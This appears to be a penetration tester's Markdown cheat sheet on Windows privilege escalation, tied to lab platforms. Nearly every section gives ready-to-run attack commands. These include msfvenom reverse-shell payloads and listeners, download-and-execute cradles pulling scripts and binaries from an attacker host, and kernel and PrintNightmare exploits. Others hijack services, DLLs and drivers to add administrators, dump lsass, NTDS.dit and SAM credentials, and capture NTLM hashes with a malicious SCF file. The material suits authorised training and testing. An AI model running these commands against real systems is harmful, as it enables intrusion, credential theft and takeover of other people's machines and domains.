# Windows Privesc

## Enumeration

- You can do some manual enumeration using [Windows CMD](powershell-cmd.md#cmd)
- You can also do automatic enumeration using dedicated [tools (see the tools below)](#tools)

## Kernel Exploits

### What is a kernel

![Kernel](https://upload.wikimedia.org/wikipedia/commons/thumb/8/8f/Kernel_Layout.svg/1024px-Kernel_Layout.svg.png)  

- [See the definition on Wikipedia](https://en.wikipedia.org/wiki/Kernel_(operating_system))

#### Windows kernel

![Windows kernel](https://www.thewindowsclub.com/wp-content/uploads/2019/08/Windows-Kernel.png)  
- [Windows kernel in detail here](https://www.thewindowsclub.com/what-is-a-kernel-in-os-what-are-the-types-of-kernel)

### Kernel Exploits

- [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)
- See an example of a privesc with a kernel exploit in [this writeup](../writeups/HTB-Devel.md)

#### Methodology

1. Enumerate win version / patch level (systeminfo)
2. Find matching exploits (Google, ExploitDB, GIthub)
3. Compile and run

**ATTENTION: Kernel exploits are often unstable and could crash the system**

### Famous kernel exploit

- MS08-067 - vulnerability in the "Server" service
- MS17-010 - EternalBlue - remote code execution vulnerability
- CVE-2021-36934 HiveNightmare - SeriousSam - Windows 10 flaw that results in ANY user having rights to read the Windows registry

### Enumeration and Exploitation Examples

- `icacls c:\Windows\System32\config\SAM` check perm on SAM file
- Exploit CVE-2021-36934 with this [poc](https://github.com/cube0x0/CVE-2021-36934) you will get hash and then will be able to get a shell for instance with psexec `psexec.py INLANEFREIGHT/administrator@10.129.43.13 -hashes aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54` 
- Check for spooler service using powershell `ls \\localhost\pipe\spoolss`
- Add local admon with PrintNightmare with this [Powershell PoC](https://github.com/calebstewart/CVE-2021-1675)
  - `Set-ExecutionPolicy Bypass -Scope Process`
  - `Import-Module .\CVE-2021-1675.ps1`
  - `Invoke-Nightmare -NewUser "username" -NewPassword "password123!" -DriverName "PrintIt"`
  - Check if it worked `net user username`
- Check installed updates 
  - Powershell `systeminfo` `wmic qfe list brief` `Get-Hotfix`
  - CMD with wmic `wmic qfe list brief`
- CVE-2020-0668
  - Check out this blog [post](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/)
  - Use this [exploit](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668)
    - Download it
    - Open it with visual studio
    - Build it
  - Check for a third party serv that can be leverage. Check perm on a binary `icacls "c:\path\to\leverage-bin.exe"`
  - Generate a malicious file `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACK-IP LPORT=PORT -f exe > leverage-bin.exe`
  - `python3 -m http.server 80` serve the binary
  - Download 2 copy of the binary
    - `wget http://ATTACK-IP/leverage-bin.exe -O leverage-bin.exe`
    - `wget http://ATTACK-IP/leverage-bin.exe -O leverage-bin2.exe`
  - Run the exploit `C:\CVE-2020-0668\CVE-2020-0668.exe C:\Users\user\Desktop\leverage-bin.exe "c:\path\to\leverage-bin.exe"`
  - Check perm of new file `icacls 'c:\path\to\leverage-bin.exe'`
  - Replace with malicious binary `copy /Y C:\Users\user\Desktop\leverage-bin2.exe "c:\path\to\leverage-bin.exe"`
  - Use a Metasploit Resource Script
    - Make a file named handler.rc and put this in it
      ```
      use exploit/multi/handler
      set PAYLOAD windows/x64/meterpreter/reverse_https
      set LHOST <our_ip>
      set LPORT 8443
      exploit
      ```
    - Launch metasploit this the resource script `msfconsole -r handler.rc`
  - Start the service `net start leverage-serv`
  - Even if we get an error we should have a reverse shell in meterpreter

### Tools

#### Executables

- [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts.
- [Watson](https://github.com/rasta-mouse/Watson) is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.
- [Seatbelt](https://github.com/GhostPack/Seatbelt) C# project for performing a wide variety of local privilege escalation checks
- [SharpUp](https://github.com/GhostPack/SharpUp) C# version of PowerUp
- [JAWS](https://github.com/411Hall/JAWS)

#### PowerShell

##### Sherlock

[Sherlock.ps1](https://github.com/rasta-mouse/Sherlock) is a powershell script that will give exploit related to the target.  
  It can also be found here on kali if empire is installed `/usr/share/powershell-empire/empire/server/data/module_source/privesc/Sherlock.ps1`
- We can launch it with cmd like this (has to be served through an http server from the attacking machine)  
  `echo IEX(New-Object Net.WebClient).DownloadString('http://ATTACK-MACHINE-IP/Sherlock.ps1') | powershell -noprofile -`
- Launch from Powershell

```powershell
Set-ExecutionPolicy -ExecutionPolicy bypass -Scope CurrentUser
Import-module -Name C:\Absolute\Path\to\Sherlock.ps1
Find-AllVulns
```

##### PowerUp

[PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) is a powershell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found.

```powershell
Set-ExecutionPolicy -ExecutionPolicy bypass -Scope CurrentUser
Import-module -Name C:\Absolute\Path\to\PowerUp.ps1
Invoke-AllChecks
```

##### JAWS

[JAWS](https://github.com/411Hall/JAWS) is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. It is written using PowerShell 2.0 so 'should' run on every Windows version since Windows 7.

#### Other

##### Exploit Suggesters

[Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) is a python script that will provide the list of vulnerabilities the OS is vulnerable to using systeminfo  
[Here](https://www.jaacostan.com/2021/04/windows-exploit-suggester-next.html) is a blog post about wes next generation  

- Here is a convenient command in wes to grep specifically for privesc exploit and have an output in color `python3 /opt/wesng/wes.py --color sysinfo.txt | grep -B 3 -A 5 "Privilege Vulnerability"`  

[Metasploit Local Exploit Suggester](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)

##### Precompiled kernel exploits

- [Precompiled kernel exploits](https://github.com/SecWiki/windows-kernel-exploits)

##### SessionGopher

- [SessionGopher](https://github.com/Arvanaghi/SessionGopher) is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information.

##### LaZagne

- [LaZagne](https://github.com/AlessandroZ/LaZagne) is a tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more

##### Sysinternals Suite

- [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) is a suite of tools that is used to monitor, manage and troubleshoot the Windows operating system owned by Microsoft. It is really useful for enumeration.
- [Security Update Guide](https://msrc.microsoft.com/update-guide/vulnerability)

#### Pre-compiled binaries. 

It can be useful to have precompiled binaries just ready to run
- [GhostPack-Compiled Binaries - harmj0y](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
- [LaZagne releases](https://github.com/AlessandroZ/LaZagne/releases/)

## Unquoted Service Path Vulnerabilities

### What is it

Abuse of the research methodology of executable of windows. We will try to place an excutable in a location windows will be looking.

### Preresquisites

- We will need write permissions in an executable folder
- Check if the binary path is unquoted, we can check a service using `sc qc name-of-service`
- Check if we have writing rights with our user we can use [accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) `.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"` we will have a list of user groups with read and write privs
- Use msfvenom to generate an executable file `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK-MACHINE-IP LPORT=7777 -f exe > executable_name.exe`
- Restart the service `sc start service-name `

### Methodology

- Enumerate with automatic tools or this command: `wmic service get name,displayname,pathname,startmode` (it will list the running services)
- Check if we can write in the folder of the service 

### Enumeration with powerUp

- `powershell -ep bypass`
- `. .\PowerUp.ps1`
- `Invoke-AllChecks`  
![image](https://user-images.githubusercontent.com/96747355/162632057-e45dc167-b88a-4e4d-a989-563eb810cda2.png)  

### Exploitation

- `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe`
- We place the executable in the folder of the program we wish to abuse
- We start the vulnerable service in our example unquotedsvc `sc start unquotedsvc`
- we should be added as an administrator we can verify this using `net localgroup administrators`

## Runas

### What is it

- It is the possibility of running a command as another user

### Enumerate

- `cmdkey /list`

### How to exploit

- Check the writeup for Access on HTB [here](../writeups/HTB-access.md) to have an example of privesc using runas

## Autorun

### What is it

- It is when you abuse the fact that a program runs automatically

### Enumerate

- Check what programs have autorun using [Windows internals - autorun](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) see example below  
![image](https://user-images.githubusercontent.com/96747355/162574595-2e7704db-5be0-411c-98f0-1b075628ec92.png)  

- Check that the program you found that allows FILE_ALL_ACCESS to Everyone using [Windows internals - accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) in our example we would type this in the cmd `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"`  
![image](https://user-images.githubusercontent.com/96747355/162574634-d6459714-366e-4afa-9735-d469eb8e3ab9.png)  

**OR**  

- With [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
  - In a win cmd type `powershell -ep bypass`
  - Then `. .\PowerUp.ps1` to load powerUp
  - `Invoke-AllChecks`  
![image](https://user-images.githubusercontent.com/96747355/162574989-40f208c1-12ac-47d6-99b7-3035cf9b4297.png)  

### How to exploit

- In kali
  - `msfconsole`
  - `use multi/handler`
  - `set payload windows/meterpreter/reverse_tcp`
  - `set lhost Your-Kali-IP-Address`
  - `run`
  - In another cmd tab `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe` (give it the same name as the program that has autorun)
- Take the program you created with msfvenom in your target (python HTTP server and then the browser in your target)
- In your target
  - Place the program in the directory where the autorun program is
  - Wait for the administrator to log in
- You should have a shell in your kali in Metasploit

## Service Escalation - Registry

### What is it

- If we have admin rights of a registry key in service we could use this to make an executable run with a service (add a user, get a shell, ...)

### Enumeration

- In a powershell prompt type `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`  
![image](https://user-images.githubusercontent.com/96747355/162577548-662dd3db-2722-40c8-ae19-3ae386d32a90.png)  

### How to exploit

- We will use this [C script](https://github.com/sagishahar/scripts/blob/master/windows_service.c)
- We will modify the whoami command: `system("whoami > c:\\windows\\temp\\service.txt");`  we will add this instead `cmd.exe /k net localgroup administrators user /add` so our script now looks like this: `system("cmd.exe /k net localgroup administrators user /add");`
- We will compile it `x86_64-w64-mingw32-gcc windows_service.c -o x.exe`
- Let's now get the the exe file in our target (python http server -> browser in our target to dl the file) and put it where we have write rights (in the example it is going to be C:\Temp)
- In a cmd from our target `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
- Now we just need to start the service `sc start regsvc`
- `net localgroup administrators` we can see that our user is now in the administrators group

## Escalation via Executable Files

### What is it

- Abusing an executable that we have permissions on

### Enumeration

- `powershell -ep bypass`
- `. .\PowerUp.ps1`
- `Invoke-AllChecks`  
![image](https://user-images.githubusercontent.com/96747355/162591193-6d2cec98-1e15-492e-b129-001c59b1ae84.png)  

**OR**

- If we know what program it is we can just do `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"` where File Permissions Service is the program we want to abuse  
![image](https://user-images.githubusercontent.com/96747355/162591258-02f01743-1c36-400c-9c13-539c42db8a79.png)  

### How to exploit

- We will use this [C script](https://github.com/sagishahar/scripts/blob/master/windows_service.c)
- We will modify the whoami command: `system("whoami > c:\\windows\\temp\\service.txt");`  we will add this instead `cmd.exe /k net localgroup administrators user /add` so our script now looks like this: `system("cmd.exe /k net localgroup administrators user /add");`
- We will compile it `x86_64-w64-mingw32-gcc windows_service.c -o x.exe`
- Let's now get the the exe file in our target (python http server -> browser in our target to dl the file) and put it where we have write rights (in the example it is going to be C:\Temp)
- In the target cmd `copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"`
- `sc start filepermsvc`
- Our user should be in the local administrators group

## Startup Applications

### What is it

- We will abuse a program that is launched on startup in which we have rights

### Enumeration

- We can enumerate using [Windows internals - icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`  
![image](https://user-images.githubusercontent.com/96747355/162592396-a2979aa4-f502-4455-b2ca-2b7997b1763c.png)  
- The `BUILTIN/Users` group has full acces `(F)` to the Startup directory

### How to exploit

- In our attack machine `msfconsole` we launch Metasploit
- `use multi/handler`
- `set payload windows/meterpreter/reverse_tcp`
- `set lhost IP-OF-OUR-ATTACK-MACHINE`
- `run`
- In another tab `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP-OF-OUR-ATTACK-MACHINE -f exe -o x.exe`
- We serve the executable in our target (python http server -> and browse to it from our target)
- We put the file in  "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" (If you are in the explorer you may have to type ProgramData in the path if it does not appear).
- We wait for an admin to log in
- We should have a shell in metasploit  
![image](https://user-images.githubusercontent.com/96747355/162592807-7867e7e1-62f9-4cca-89b9-78ed895ee09c.png)  

## DLL Hijacking

### What is it

- DLL is a dynamic Library they often run with executables, when an executable runs the system will look for the dll and if the dll does not exist we could replace it with one of our own.

### Enumeration

- We can find it using procmon, we need to add 2 filters "Result is NAME NOT FOUND" and "PATH ends with .dll"  
![image](https://user-images.githubusercontent.com/96747355/162593986-a50865dc-11eb-44ef-8793-60bbdd2adaa1.png)  
  - This will list the dll not found
  - We will need write access to the folder where the dll are missing

### How to exploit

- We are going to use [windows_dll.c](https://github.com/sagishahar/scripts/blob/master/windows_dll.c)
- Edit the file and modify the system command to add our user to the admin goup which would look like this: `system("cmd.exe /k net localgroup administrators user /add");`
- We can now compile it `x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll`
- We serve it to our target (python http server -> browser of our target)
- We put it in the path where the system will look for it, in our example it is the temp folder
- We restart the service `sc stop dllsvc & sc start dllsvc`
- Our user should be in the admin group now

## Binary path

### Enumeration

- PowerUP we should see the service exploitable under the `[*] Checking service permissions`  

**OR**

- We can use [accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) `accesschk64.exe -wuvc Everyone *`
  - Will list service we can write and to which everyone has access (in our example the service is daclsvc)
![image](https://user-images.githubusercontent.com/96747355/162620616-800737e9-9762-4a0e-b06d-41ea822abd32.png)  

### Exploitation

- `sc config daclsvc binpath= "net localgroup administrators user /add"`
- `sc start daclsvc`
- We should be added to the administrators group `net localgroup administrators`

## Escalation via User Privileges

### SeDebugPrivilege

#### Enumeration

- `whoami /priv` the `SeDebugPrivilege` should be listed

#### Exploitation

- `procdump.exe -accepteula -ma lsass.exe lsass.dmp` We will use ProcDump from the SysInternals suite to leverage this privilege and dump the lsass process memory.
- We can launch mimikatz from our target
  - `mimikatz.exe`
  - `log`
  - `sekurlsa::minidump lsass.dmp`
  - `sekurlsa::logonpasswords`
  - And now we can take the hashes we need
- If mimikatz does not work and if we have RDP we can dump lsass from the taskmanager (tab "Details" right click on the lsass process and select "Create dump file"
- We can then take the dump to our attack machine et use pypykatz 
  - `pypykatz lsa minidump lsass.DMP`

### SeTakeOwnershipPrivilege

- With this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, Remote Code Execution (RCE) or Denial-of-Service (DOS). In this case we need a file to target.

#### Enumeration

- `whoami /priv` SeTakeOwnershipPrivilege should be listed  
![image](https://user-images.githubusercontent.com/96747355/163725780-10a9f805-e181-42af-afe3-8d28f2cc5648.png)  

#### Exploitation

- If necessary enable the privilege using [this script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) 
  - `Import-Module .\Enable-Privilege.ps1`
  - `.\EnableAllTokenPrivs.ps1`  
  ![image](https://user-images.githubusercontent.com/96747355/163725814-fde11deb-34a3-4c08-9c60-6313293833b1.png)  
- Take ownership of a flag using [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) ` 
- Check the change of ownership worked `PS C:\htb> Get-ChildItem -Path 'C:\Path\To\File' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}`
- Modify the file ACL with [icalcs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) `icacls 'C:\Path\To\File' /grant user:F`
- Use the file you have ownership now! :D
  
## Privesc via Group Privileges

### Backup Operators

#### SeBackupPrivilege

- This allows us to copy a file from a folder
- [Here](https://github.com/giuliano108/SeBackupPrivilege) is a poc to abuse this
  - We need to import the libs `Import-Module .\SeBackupPrivilegeUtils.dll` and `Import-Module .\SeBackupPrivilegeCmdLets.dll`
  - `whoami /priv` to check if we have the SeBackupPrivilege  
  ![image](https://user-images.githubusercontent.com/96747355/163727583-cecc0265-3eab-4caf-93b4-47d92842588b.png)  
  - It is disabled so we can enable it with `Set-SeBackupPrivilege`  
  ![image](https://user-images.githubusercontent.com/96747355/163727652-893533c0-1e31-4f8f-8519-fe9884fe5a01.png)  
- We can now copy protected files and then use them `Copy-FileSeBackupPrivilege 'c:\path\to\file\file.txt' .\file.txt` 

##### Copying NTDS.dit (for DC)

- This group will also let us logging in locally to a domain controller.
- NTDS is the active directory database it contains the ntlm hashes of all users and computers in the domain
- We can use [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) to make a copy of the drive `diskshadow.exe`  
```
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```
- Then we just need to copy it with the SeBackupPrivilege `Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\paht\to\destination\ntds.dit`

##### Backing up SAM and SYSTEM 

- `reg save HKLM\SYSTEM SYSTEM.SAV`
- `reg save HKLM\SAM SAM.SAV`

##### Extract the creds

- We can use secretdumps `secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL` or the ps module DSInternals  
```
PS C:\user> Import-Module .\DSInternals.psd1
PS C:\user> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\user> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=domain,DC=local' -DBPath .\ntds.dit -BootKey $key
```
- *Note: We can also use [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) to copy the files*

### Event log readers

- `net localgroup "Event Log Readers"`
- `wevtutil qe Security /rd:true /f:text | Select-String "/user"` search Security logs (credentials could be dropped this way)
- `Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}` Another way to do the same thing
- It is also worth to check PowerShell Operational logs

### DnsAdmins

- Using this group privileges, it is possible to use [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) to specify the path of a DLL plugin.
- `Get-ADGroupMember -Identity DnsAdmins` to confirm group membership
- `msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll` we generate a dll with msfvenom that will add a user or we can make one that will get us a shell as admin `msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=4444 -f dll -o shell.dl`
- Do not forget to launch a listener if you use the reverse shell `rlwrap nc -lnvp 4444`
- Serve the dll using python web server `python3 -m http.server 80` 
- Download the file in the target `wget "http://Attacking-machine-IP/adduser.dll" -outfile "adduser.dll"` (in powershell)  
- `dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll` load custom dll (in CMD)  
![image](https://user-images.githubusercontent.com/96747355/164776674-cd278ef1-2f02-456f-9038-2a37698c1efa.png)  
- `sc stop dns` 
- `sc start dns`
- `net group "Domain Admins" /dom` check that we have the priv (or catch the shell)

### Hyper-V Administrators

- CVE-2018-0952
- CVE-2019-0841
- [Hyper V admin EOP - decoder it](https://github.com/decoder-it/Hyper-V-admin-EOP/blob/master/hyperv-eop.ps1)
- Has been mitigated since March 2020

### Print Operators

- We  need to check for the `SeLoadDriverPrivilege` in a cmd shell launched as admin `whoami /priv`  
![image](https://user-images.githubusercontent.com/96747355/164988812-a217a132-8e73-4220-a912-142128e7472e.png)  
- We download this [tool](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) to enable the privilege. We need to add the few lines at the begining of the script
```
#include <stdio.h>
#include "tchar.h"
```
- We can then compile it using cl.exe from a visual studio cmd `cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`
- We then have to download the [Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) driver file 
- We can then add the reference to the drive `reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"`
- In powershell we check that the Capcom driver is not loaded with [DriverView.exe](http://www.nirsoft.net/utils/driverview.html)
  - `.\DriverView.exe /stext drivers.txt`
  - `cat drivers.txt | Select-String -pattern Capcom`
 - Now we need to check it has been enabled  
![image](https://user-images.githubusercontent.com/96747355/164989997-57ddd8d9-3994-4ff0-ac14-8e07dd81800a.png)  
- Finally we can launch the exploit using [ExploitCapcom.exe](https://github.com/tandasat/ExploitCapcom) it will launch a shell as authority system

### Server Operators

- With this group you will get the`SeBackupPrivilege` and `SeRestorePrivilege`
- `sc qc AppReadiness`
- We can check permissions with sysinternals [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice)
  - `c:\PsService.exe security AppReadiness`
- Modify service binary path `sc config AppReadiness binPath= "cmd /c net localgroup Administrators current-user /add"`
- `sc start AppReadiness` Start the service (will fail)
- We should be in the Admin group `net localgroup Administrators`
- We can now retrieve creds with crackmapexec `crackmapexec smb IP-ADDRESS -u current-user -p 'current password'`
- Dump hash and pass `secretsdump.py current-user@IP-ADDRESS -just-dc-user administrator`
- We can then get an admin shell using the found hashes `psexec.py INLANEFREIGHT/administrator@IP-ADDRESS -hashes aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54 `

## Privesc via OS attacks

### UAC Bypass

- Checkout the Pentips on uac bypass [here](UACbypass.md)
- `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA` confirm UAS is enabled
- `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin` Checking UAC Level
- If `ConsentPromptBehaviorAdmin` is 0x5 it means the highest UAC level of `Always notify` is enabled
- `[environment]::OSVersion.Version` check win OS version compare with version history [here](https://en.wikipedia.org/wiki/Windows_10_version_history)
- List of UAC bypass [here](https://github.com/hfiref0x/UACME)
- `msfvenom -p windows/shell_reverse_tcp LHOST=IP_ADDRESS-OF_ATTACK_MACHINE LPORT=PORT -f dll > srrstr.dll` generate a malicious dll
- `python3 -m http.server 80` serve it to the target
- `curl http://IP-ATTACK-MACHINE/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"` get it on the target
- `nc -lvnp CHOSEN-PORT` launch listener
- `rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll` run the dll to get the reverse shell back and check if uac is enabled for our current user
- `C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe` execute this to get an elevated shell

### Weak permissions

#### Permissive ACLs

- Pentips on abusing ACLs [here](abusing-acl.md)
- `.\SharpUp.exe audit` to enumerate
- If you detect an executable that you could abuse you can check the permissions with [icacls](https://ss64.com/nt/icacls.html) `icacls "C:\Path\to\file.exe"`
- Make a back up of the original binary and replace it with a malicious one generated by msfvenom `msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=8888 -f exe > file.exe` (instead of shell name it with the name of the executable that you are abusing
- Set up a listener `nc -lnvp 8888`
- `cmd /c copy /Y file.exe "C:\Path\to\file.exe"` copy the exec instead of the original one
- `sc start file` start the service
- Get your shell
- If you want to exploit it by adding a user `msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators user /add" -f exe > file.exe`

#### Weak Service permissions

- `.\SharpUp.exe audit` to enumerate
- Check permissions on the file you might be able to abuse using win internals [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) `accesschk.exe /accepteula -quvcw service`
- `sc config service binpath="cmd /c net localgroup administrators user /add"` change the service binary path 
- `sc stop service` stop the service
- `sc start service` start the service (it will fail but our exploit will work)
- `net localgroup administrators` check that you user is now admin
- To clean up
  - `sc config WindScribeService binpath="C:\Path\to\service.exe"` revert binary path
  - `sc start service` start the service
  - `sc query service` check that service is running

## Privesc with found credentials

- You can read more about hunting credentials [here](powershell-cmd.md#hunting-passwords) and [here](powershell-cmd.md#misc)

### Browser Credentials

- We can use [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrive cookies and saved logins from Google Chrome
- We can use [lazagne](https://github.com/AlessandroZ/LaZagne) to dump passwords from the system `.\lazagne.exe all`

## Other ways to privesc

### Interact with users

- Capture traffic if wireshark is installed
- Process monitoring
  ```
  while($true)
  {

    $process = Get-WmiObject Win32_Process | Select-Object CommandLine
    Start-Sleep 1
    $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
    Compare-Object -ReferenceObject $process -DifferenceObject $process2

  }
  ```
  - `IEX (iwr 'http//IP-OF-ATTACK-MACHINE/procmon.ps1')` execute the script from our target with the code hosted in our attacking machine
- Vulnerable service abuse
- Shell Command File on File Share to capture ntlmv2 pass hash.
  - We need an interesting share writable by our user `accesschk -s -w C:\folder-of-shares`
  - Create a malicious SCF file and name it with an @ at the start for example `@Inventory.scf`
  ```
  [Shell]
  Command=2
  IconFile=\\ATTACK-IP\share\legit.ico
  [Taskbar]
  Command=ToggleDesktop
  ```
  - We then just need to start Responder 
    - `sudo responder -wrf -v -I INTERFACE-USED` (your interface can be tun0 for instance it has to be one reachable by the target)
  - Finally we can crack the found hash with hashcat `hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt`

## Privesc on Legacy OS

### Windows Server 2008

- `wmic qfe` will show missing KBs
- We can use [Sherlock](https://github.com/rasta-mouse/Sherlock) to find the vulnerabilities the target might have.
  - On powershell `Set-ExecutionPolicy bypass -Scope process`
  - `Import-Module .\Sherlock.ps1`
  - `Find-AllVulns`
- Get a meterpreter shell
  - `msfconsole`
  - `search smb_delivery` you should see this one `0  exploit/windows/smb/smb_delivery  2016-07-26       excellent  No     SMB Delivery`
  - `use 0`
  - `show options` set srvhost and lhost to your attack machine
  - set the target to DLL (`show targets` `set target 0`
  - `exploit`
  - Paste the comand shown on msf in the target
  - Receive the shell
- Find a local privesc exploit
 - For example we can use CVE 2010-3338
 - on metasploit `search 2010-3338` you should see `0  exploit/windows/local/ms10_092_schelevator  2010-09-13       excellent  Yes    Windows Escalate Task Scheduler XML Privilege Escalation`
 - Migrate the process
 - Backgound the session `background`
 - `set session 1`
 - set lhost to your attacking machine IP
 - set lport to a free prot
 - `exploit`
 - You should get an elevated shell

### Windows Desktop 7

- Gather `systeminfo` and use [windows exploit suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
  - `python2.7 windows-exploit-suggester.py --update` this will dl a database file in xls format that you can use
  - `python2.7 windows-exploit-suggester.py --database 2022-04-30-mssb.xls --systeminfo systeminfo`
- Example of MS16-032 with this [poc](https://www.exploit-db.com/exploits/39719)
  - In Powershell `Set-ExecutionPolicy bypass -scope process`
  - `Import-Module .\exploit.ps1`
  - `Invoke-MS16-032`
  - We will get an elevated shell

## Checklists

- [Hacktricks](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

## Resources

{% embed url="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners" %} TCM Security Academy - Windows Privilege Escalation {% endembed %}  
{% embed url="https://tryhackme.com/room/windowsprivescarena" %} Windows privesc arena by TCM on TryHackMe {% endembed %}
{% embed url="https://www.fuzzysecurity.com/tutorials/16.html" %} Windows privesc on Fuzzy Security{% endembed %}  
{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" %} Windows privesc on PayloadsAllTheThings{% endembed %}  
{% embed url="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" %} Windows privesc on Absolomb{% endembed %}  
{% embed url="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html" %} Windows privesc Sushant 747{% endembed %}  
{% embed url="https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources" %} Windows-Privilege-Escalation-Resources - TCM Course Resources - Gr1mmie {% endembed %}  
{% embed url="https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation" %} Windows PrivEsc Checklist - Hacktricks {% endembed %}  
{% embed url="https://github.com/gtworek/Priv2Admin" %} Priv2Admin {% endembed %}  
{% embed url="https://www.leeholmes.com/adjusting-token-privileges-in-powershell/" %} ADJUSTING TOKEN PRIVILEGES IN POWERSHELL - LEE HOLMES {% endembed %}  
{% embed url="https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77" %} Enable All Token Privileges - Mark Mo{% endembed %}  
